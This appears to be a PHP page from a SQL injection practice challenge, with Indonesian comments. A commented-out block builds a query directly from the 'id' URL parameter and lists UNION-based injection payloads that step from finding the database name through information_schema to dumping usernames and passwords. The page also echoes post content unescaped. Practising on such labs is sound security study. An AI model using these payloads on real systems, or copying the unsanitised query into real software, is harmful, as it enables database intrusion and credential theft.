<!-- <?php


// include 'connection.php';

// $id = intval($_GET['id']); //versi aman
// $id = $_GET['id'];
// $q  = mysqli_query($conn, "SELECT * FROM post WHERE id = '{$id}'") or die("apa yang kau inputkan hei!!");
// $post = mysqli_fetch_array($q);

// query
// id
//  999 UNION SELECT 1,2,3,4 
// 'id'
// ' UNION SELECT 1,2,3,4--+ 

// check database name
// ' UNION SELECT 1,database(), 3, 4--+ 

// check table
// ' UNION SELECT 1,group_concat(table_name), 3, 4 FROM information_schema.tables WHERE table_schema = 'chall3'--+ 

// check column
// ' UNION SELECT 1,group_concat(column_name), 3, 4 FROM information_schema.columns WHERE table_schema = 'chall3' AND table_name = 'user'--+

// get username and password
// ' UNION SELECT 1,username, 3, password FROM user--+ 


?> -->
<!DOCTYPE html>
<html lang="en">

<head>
	<title>Page</title>
	<meta http-equiv="content-type" content="text/html;charset=utf-8" />
	<link rel="stylesheet" href="css/style.css">
</head>
<body class="admin">
    <nav class="navtop">
        <div>
	<h1 style="text-align: center">Page petani(fetch)</h1>
	<hr>
	<a href="index.php">Home</a>
	<hr>
	</div>
    </nav>
    <div class="content">
	<h1>List petani</h1>
    <hr>
    <p>tabel...</p>


	<?php echo $post['konten'] ?> -->
	</div>
	<div class="navbar">
		<footer class="footer">
			<p>company name</p>
		</footer>
	</div>	
</body>

</html>